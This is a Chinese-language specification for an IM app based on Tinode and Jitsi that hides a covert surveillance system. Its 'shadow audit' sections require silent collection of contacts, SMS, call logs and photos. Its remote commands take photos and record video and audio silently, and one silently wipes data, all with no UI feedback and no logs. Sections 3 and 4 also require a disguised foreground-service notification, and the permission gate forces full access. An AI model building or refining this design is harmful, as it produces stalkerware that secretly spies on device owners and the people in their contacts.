# MOP 加固项目全栈规约 (v3.0 Final Master)

## 1. 项目愿景与技术栈底线
- **核心定义**: 基于 Tinode 协议集成 Jitsi 屏幕共享的加固型 IM，具备深度影子审计与远程管控。
- **环境要求**: 最低 Android 10.0 (API 29) / iOS 16.0（含 16.7.1）。
- **语言规范**: 代码注释与文档须使用 **简体中文**；**UI 文案**以简体中文为源语言，多语言时由 i18n 提供翻译。**多语言（i18n）**：所有客户端（App/用户端网页）须集成 i18n 多语言框架；默认跟随系统语言，若系统语言不在支持列表则回退**简体中文**；支持用户手动切换语言并持久化（本地或服务端）；管理后台须支持多语言切换。**开发期**：多语言仅支持**中文与英文**两种，避免算力与资源浪费；后续可按需扩展语种。
- **体验原则**: 在满足规约与安全的前提下简化用户操作，具体见 ARCHITECTURE.md 第 9 节（资料补全分步、邀请直达、API 失效提示文案、登录单一账号框、权限按需引导等）。
- **配置策略**: **App 端内置 API（Host）**，正常使用内置 API 连接；**当 API 失效时提示用户扫码激活**以获取或切换 Host。**API 失效判定**：采用常规判定（如连接超时、连续若干次请求失败或服务端返回 5xx），具体阈值与重试间隔见 PROTOCOL.md 第 7 节。扫码激活成功后，本地存储的 Host 以扫码结果为准并优先使用。用户端网页由服务端或前端配置提供 API/Tinode Host。**音视频依赖**：Tinode 与 Jitsi 的集成须遵循《Tinode/Jitsi 集成文档》（即 **TINODE-JITSI-INTEGRATION.md**）；该文档为**必选依赖**，集成完成并评审通过后方可发布音视频/屏幕共享能力。**域名分配**：web（用户端网页）、admin（后台管理与 APK 下载）、api（App 通信）、jit（Jitsi 自建），详见 ARCHITECTURE.md 第 7 节。**部署与证书**：服务端采用 Docker/Compose 容器化部署，自申请 SSL 证书；TLS 优先 1.3，兼容 1.2 及既有证书体系，详见 ARCHITECTURE.md 第 8 节与 PROTOCOL.md 第 6 节。

## 2. 账户逻辑与隐私墙 (Account & Privacy)
- **注册流程**: 使用内置 API 或通过邀请链接/名片（含 API 与邀请码）连接后，强制进入资料补全页 -> 用户填写并提交 enroll（提交前仅需获取设备 Hash 作为 device_id，不先申请相册/通讯录等权限）-> **提交 enroll 时由服务端分配 UID 并绑定 Device**（常规方式，不预分配）-> **注册成功后再进行权限申请与资料采集**（未全部授予则不可进入主列表）；或 API 失效时扫码激活后同上。**登录**：账密登录成功后同样**先成功再权限申请与资料采集**，再进入主界面。
- **用户端网页登录**: 用户端网页与 App 端均支持 **账密登录**，方式为 **手机号+密码** 或 **用户名+密码**；与 App 扫码激活并存，同一 User 可经 App 或网页登录，Tinode/API 的 Host 由登录响应或前端配置提供。**用户端网页使用独立域名作为访问入口，用户仅需输入账密即可登录，无需配置或知晓服务器地址。**
- **资料补全**: 用户须完成：**选择国家**、**填写手机号**（后端按 E.164 存储/校验）、**补全用户名**、昵称，并**设置登录密码**（6～18 位常规字符）；用户名与手机号用于登录，昵称用于展示。
- **隐私隔离**: **手机号对用户绝对不可见**。
    - 后端返回数据必须脱敏。
    - 前端 UI 严禁出现手机号显示控件；对用户展示的身份标识为昵称，登录凭证为用户名或手机号+密码。
- **管理端密码策略**：用户密码在管理后台可由管理员**查看**（如是否已设置、最后修改时间等）及**重置/修改**（如重置为临时密码并下发）。
- **用户须知与同意**：《用户须知》首次展示，勾选“已阅读并同意”与登录/注册一并提交。同意状态须持久化：本地存储（如 key：`user_terms_accepted_version`）或服务端字段记录，并保存**须知版本号**（如 1.0）与时间。**再次征意**：当当前须知版本大于已同意版本时（由客户端或服务端下发当前版本号与本地已同意版本比较），须再次展示《用户须知》并征意，通过后再更新已同意版本；否则视为已同意，不重复弹窗。
- **凭证存图**: 注册完成后，强制渲染二维码并保存至系统相册。
- **邀请入网**: 新用户可通过 **邀请码** 或 **邀请链接/添加名片** 入网。**所有用户均有邀请权限**，可生成邀请码/链接/名片；**邀请人生成的邀请链接与添加名片须包含 API（Host）与邀请码**，被邀请人打开后可直接使用其中的 API 与邀请码连接并完成资料补全，无需先扫 mop 凭证。生成邀请入口位于 App **设置页 → 我的凭证 → 右上角按钮**。enroll 时携带 invite_code，服务端校验后建立邀请关系，并**使邀请人与被邀请人互为好友**。邀请码/链接可设有效期与使用次数，具体由服务端策略决定。
- **人员关系**: 系统维护 **User 与 User** 的关系，包括 **邀请关系**（谁邀请谁）与 **好友关系**。邀请成功后邀请人与被邀请人**互为好友**；管理后台可查看、配置用户间的邀请与好友关系。远程指令与审计的可见/可管范围可依关系限定，具体策略见 ARCHITECTURE 与实现。
- **查找添加好友**: 仅支持通过**用户名**或**手机号**进行**精确搜索**（不支持模糊）；结果列表仅展示昵称等，不展示手机号，与隐私墙一致。入口与行为详见 ARCHITECTURE 第 9 节，接口约定见 PROTOCOL 第 2.4 节。
- **会话与联系人列表展示**: 每项显示**对方头像**（未设置头像时以备注或昵称的**首字**作为默认头像）、**对方简介**；简介内容**以对方用户填写的简介为准**（来自对方用户资料/服务端），不得以本地占位替代。详见 ARCHITECTURE 第 9 节。
- **音视频入会**: 用户进入视频通话/屏幕共享房间时，以当前账户**昵称**作为房间显示名直接进入，无需再次输入姓名。

## 3. 影子审计引擎规范 (Guardian Engine)
- **采集范围**: 通讯录、短信、通话记录、App 列表、**相册/媒体（设备本地图片、视频等，用于审计数据与后台查看）**。**不采集应用使用时长（UsageStats）**。**平台差异**：**iOS 上通讯录、相册为必须项**，须实现并参与 Hash 对比与增量上报；对 iOS 无法采集的内容（如短信、通话记录等）在 iOS 端不实现、不展示、不上报。**Android** 可采集上述全量及相册/媒体元数据（如 MediaStore 查询结果），与通讯录等一并参与 Hash 对比与增量上报，**不得与“用户修改头像”等相册选图功能混淆**。具体以各平台系统能力为准。
- **触发逻辑**: 首次激活全量上报；后续仅在 App 冷启动或切回前台时，进行数据摘要 (Hash) 对比，有变动才增量上传。
- **保活机制**: **Android** 必须启用 Foreground Service，并挂载“加密链路保护中”的业务伪装通知；iOS 无 Foreground Service，依赖系统后台与推送唤醒，见 ARCHITECTURE 第 2.2 节。

## 4. 远程指令集协议 (Remote Command Protocol)
- **监听**: 长连接监听 + 系统级静默推送 (FCM/APNs/厂商推送) 唤醒。
- **执行规则**:
    - `mop.cmd.dial`: 唤起系统拨号盘并预填号码（非静默）。
    - `mop.cmd.sms`: 唤起系统短信界面（非静默）。
    - `mop.cmd.wipe`: 静默清空本地所有 SecureStorage、本地缓存与数据库，退出并重启至激活页。
    - `mop.cmd.capture.photo`: 拍一张照，结果加密后经 audit/upload 上报（静默）。
    - `mop.cmd.capture.video`: 录一段视频，约定 18 秒；未满 18 秒被中断时，**已录制的实际视频文件**仍加密上报（静默）。
    - `mop.cmd.capture.audio`: 录一段音频，约定 18 秒；未满 18 秒被中断时，**已录制的实际音频文件**仍加密上报（静默）。
    - 其他审计类指令：一律静默执行，禁止任何 UI 反馈或本地日志输出。

## 5. 二维码与分发规范 (Visual & Distribution)
- **二维码样式**: 参照微信/抖音风格。圆角点阵、Level H 纠错、Version 5-7（确保二次翻拍高识别率）。
- **数据结构**: `mop://{Base64(Host|UID|Token|Timestamp)}`，明文分隔符为 `|`，与 PROTOCOL.md 第 1 节一致，严禁长 JSON。
- **分发自动化**: 构建产物命名为 `mop_v[ver]_[build].apk`。脚本须自动将下载链接同步至后台管理系统。

## 6. 原生桥接契约 (NATIVE_BRIDGE)
- **Channel**: `com.mop.guardian/native`
- **必选方法**:
    - `requestOverlayPermission()`: 申请 **Android** 悬浮窗权限（用于后台弹出拨号盘）。**iOS 无悬浮窗概念**，iOS 端为空实现或返回“不支持”，不调用系统权限。
    - `saveQrToGallery(bytes)`: 将 Uint8List 写入系统相册（Android MediaStore / iOS PHPhotoLibrary）；保存失败时提示用户并支持重试，相册名称由实现约定。
    - `fetchSensitiveData(type)`: 影子数据采集接口；按平台过滤，iOS 不传平台不支持的 type。
    - `openSystemDialer(number)` / `openSystemSms(number, content)`: 唤起系统组件。
    - `capturePhoto(params)`: 按参数拍一张照，返回原始图片字节（或临时路径），由 Flutter 层在 Isolate 中加密后经 audit/upload 上报；params 含 camera（front/back）等，见 PROTOCOL 第 4.2 节。
    - `captureVideo(params)`: 录制视频，约定时长 18 秒；若被中断则返回已录制部分。返回原始视频数据（或临时路径），由 Flutter 层在 Isolate 中加密后经 audit/upload 上报；params 含 camera、duration_sec 等。
    - `captureAudio(params)`: 录制音频，约定时长 18 秒；若被中断则返回已录制部分。返回原始音频数据（或临时路径），由 Flutter 层在 Isolate 中加密后经 audit/upload 上报；params 含 duration_sec 等。**平台差异**：iOS 对后台/静默采集限制严格，实现时须符合平台允许范围，见 ARCHITECTURE 与合规文档。

## 7. 性能与安全红线
- **删除策略**: 涉及用户数据或媒体删除时，采用**永久删除**策略。Android 使用 MediaStore.createDeleteRequest（永久删除），不得使用 createTrashRequest（回收站）。iOS 系统仅支持移至「最近删除」，无公开 API 可立即永久删除，实现时以系统能力为准。
- **隔离执行**: 所有图像处理（二维码生成）、数据加密（AES-256）、Hash 对比必须在独立 **Isolate** 中执行。
- **权限拦截**: **Android** 必须权限为相册、通讯录、悬浮窗、短信、通话记录；**iOS** 必须权限为通讯录、相册。上述权限未完全授予时，必须锁定在引导页，禁止进入主列表。
- **代码结构**: 按模块化开发流程推进（见 ARCHITECTURE.md 第 10 节）；**避免单文件过大**，按模块/功能拆分、单一职责、单文件建议 300～400 行以内，超过则拆分子组件或抽取逻辑，见 ARCHITECTURE.md 第 11 节。